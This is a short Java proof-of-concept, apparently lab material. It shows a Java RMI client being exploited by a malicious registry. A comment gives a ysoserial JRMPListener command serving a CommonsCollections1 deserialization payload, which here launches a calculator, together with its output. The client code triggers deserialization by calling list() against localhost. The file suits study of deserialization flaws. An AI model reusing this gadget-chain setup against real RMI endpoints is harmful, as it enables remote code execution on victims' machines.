package RMIAttack.AttackClient;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class InocentClient {
    public static void main(String[] args) throws Exception {
    /*
➜  Java-Tools java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "/usr/bin/gnome-calculator"
* Opening JRMP listener on 1099
Have connection from /127.0.0.1:34246
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection

     */
        Registry registry = LocateRegistry.getRegistry("localhost",1099);
        registry.list();
        /*
            public String[] list() throws AccessException, RemoteException {
        try {
            RemoteCall var1 = super.ref.newCall(this, operations, 1, 4905912898345647071L);
            super.ref.invoke(var1);

            String[] var2;
            try {
                ObjectInput var5 = var1.getInputStream();
                var2 = (String[])var5.readObject();
         */
    }
}
